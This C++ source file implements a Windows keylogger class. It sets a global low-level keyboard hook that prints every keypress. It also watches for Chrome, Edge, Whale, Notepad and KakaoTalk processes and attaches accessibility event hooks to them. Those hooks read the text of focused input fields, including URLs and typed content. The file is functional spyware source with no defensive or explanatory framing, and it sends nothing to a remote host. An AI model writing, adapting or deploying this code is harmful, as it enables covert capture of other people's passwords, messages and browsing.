#include "BaseInc.h"

CKeyBoard::CKeyBoard() :
	m_init_proc_thread(FALSE), m_init_event_thread(FALSE),
	m_key_hook(nullptr), m_init_kbdh_thread(FALSE)
{

}

CKeyBoard::~CKeyBoard()
{
	Finalize();
}

void CKeyBoard::Initialize()
{
	CoInitializeEx(NULL, COINIT_MULTITHREADED);

	InitializeProcessThread();

	InitKeyBoardHook();
}

void CKeyBoard::Finalize()
{
	m_init_proc_thread = FALSE;

	m_init_kbdh_thread = FALSE;

	ResetEventHook();

	UnhookWindowsHookEx(m_key_hook);

	CoUninitialize();
}

void CKeyBoard::InitializeProcessThread()
{
	HANDLE hthread;
	DWORD dwthread;

	m_init_proc_thread = TRUE;

	hthread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ProcessThread, this, 0, &dwthread);

	CloseHandle(hthread);
}

void WINAPI CKeyBoard::ProcessThread()
{
	CKeyBoard::Get().DoProcessThread();
}

void CKeyBoard::DoProcessThread()
{

	while (m_init_proc_thread)
	{
		HANDLE hsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		std::map<std::wstring, DWORD>browser_map;

		if (hsnapshot == INVALID_HANDLE_VALUE)
		{
			return;
		}

		PROCESSENTRY32 pe;
		pe.dwSize = sizeof(PROCESSENTRY32);

		if (Process32First(hsnapshot, &pe))
		{
			do
			{
				if (_tcsicmp(pe.szExeFile, _T("chrome.exe")) == 0 && browser_map[_T("chrome.exe")] == NULL)
				{
					browser_map[_T("chrome.exe")] = pe.th32ProcessID;
				}
				else if (_tcsicmp(pe.szExeFile, _T("msedge.exe")) == 0 && browser_map[_T("msedge.exe")] == NULL)
				{
					browser_map[_T("msedge.exe")] = pe.th32ProcessID;
				}
				else if (_tcsicmp(pe.szExeFile, _T("whale.exe")) == 0 && browser_map[_T("whale.exe")] == NULL)
				{
					browser_map[_T("whale.exe")] = pe.th32ProcessID;
				}
				else if (_tcsicmp(pe.szExeFile, _T("notepad.exe")) == 0 && browser_map[_T("notepad.exe")] == NULL)
				{
					browser_map[_T("notepad.exe")] = pe.th32ProcessID;
				}
				else if (_tcsicmp(pe.szExeFile, _T("KakaoTalk.exe")) == 0 && browser_map[_T("KakaoTalk.exe")] == NULL)
				{
					browser_map[_T("KakaoTalk.exe")] = pe.th32ProcessID;
				}

			} while (Process32Next(hsnapshot, &pe));
		}

		if (m_browser_map != browser_map)
		{
			m_browser_map = browser_map;
			ResetEventHook();
			InitEventHook();
		}

		Sleep(100);

		CloseHandle(hsnapshot);
	}
}

void CKeyBoard::InitKeyBoardHook()
{
	MSG msg;
	m_init_kbdh_thread = TRUE;
	m_key_hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyBoardHook, (HINSTANCE)NULL, NULL);

	while (m_init_kbdh_thread)
	{
		GetMessage(&msg, NULL, 0, 0);
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}

LRESULT CALLBACK CKeyBoard::KeyBoardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION)
	{
		KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
		DWORD vkCode = pKeyBoard->vkCode;

		switch (wParam)
		{
		case WM_KEYDOWN:
			std::cout << (char)vkCode << std::endl;
			break;
		}
	}

	return CallNextHookEx(CKeyBoard::Get().GetKeyHook(), nCode, wParam, lParam);
}

void CKeyBoard::InitEventHook()
{
	HANDLE hthread;
	DWORD dwthread;

	m_init_event_thread = TRUE;

	hthread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)EventThread, this, 0, &dwthread);

	CloseHandle(hthread);
}

void CKeyBoard::ResetEventHook()
{
	std::map<std::wstring, DWORD>::iterator it;

	m_init_event_thread = FALSE;

	for (it = m_browser_map.begin(); it != m_browser_map.end(); it++)
	{
		if (m_hook_map[(*it).first] != nullptr)
		{
			UnhookWinEvent(m_hook_map[(*it).first]);
		}
	}

	m_hook_map.clear();
}

void WINAPI CKeyBoard::EventThread()
{
	CKeyBoard::Get().DoEventThread();
}

void CKeyBoard::DoEventThread()
{
	MSG msg;
	std::map<std::wstring, DWORD>::iterator it;

	for (it = m_browser_map.begin(); it != m_browser_map.end(); it++)
	{
		m_hook_map[(*it).first] = SetWinEventHook(EVENT_OBJECT_VALUECHANGE, EVENT_OBJECT_VALUECHANGE, 0, WinProcEvent, (*it).second, 0, WINEVENT_OUTOFCONTEXT);
	}

	while (m_init_event_thread)
	{
		GetMessage(&msg, NULL, 0, 0);
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}

void CALLBACK CKeyBoard::WinProcEvent(HWINEVENTHOOK hWinEventHook,
	DWORD event,
	HWND hwnd,
	LONG idObject,
	LONG idChild,
	DWORD idEventThread,
	DWORD dwmsEventTime)
{
	CKeyBoard::Get().DoWinProcEvent(hWinEventHook, event, hwnd, idObject, idChild, idEventThread, dwmsEventTime);
}

void CKeyBoard::DoWinProcEvent(HWINEVENTHOOK hWinEventHook,
	DWORD event,
	HWND hwnd,
	LONG idObject,
	LONG idChild,
	DWORD idEventThread,
	DWORD dwmsEventTime)
{
	IAccessible* acc = NULL;
	VARIANT tmpChild;
	VARIANT tmp;

	if (AccessibleObjectFromEvent(hwnd, idObject, idChild, &acc, &tmpChild) != S_OK || acc == NULL)
		return;

	acc->get_accRole(tmpChild, &tmp);

	KeyboardTrace(acc, tmpChild, hwnd);

	if (acc != NULL)
	{
		acc->Release();
	}
}

void CKeyBoard::KeyboardTrace(IAccessible* acc, VARIANT child, HWND hwnd)
{
	VARIANT role;
	VARIANT state;
	BSTR value;

	std::string url;

	if (acc->get_accRole(child, &role) != S_OK)
		return;

	if (acc->get_accState(child, &state) != S_OK)
		return;

	if ((role.intVal == ROLE_SYSTEM_TEXT || role.intVal == ROLE_SYSTEM_DOCUMENT || role.intVal == ROLE_SYSTEM_COMBOBOX) &&
		(state.intVal & STATE_SYSTEM_FOCUSED) == STATE_SYSTEM_FOCUSED)
	{
		if (acc->get_accValue(child, &value) != S_OK)
		{
			url = "";
		}
		else if (value != NULL)
		{
			url = _bstr_t(value);
		}

		std::cout << url << std::endl;
	}
}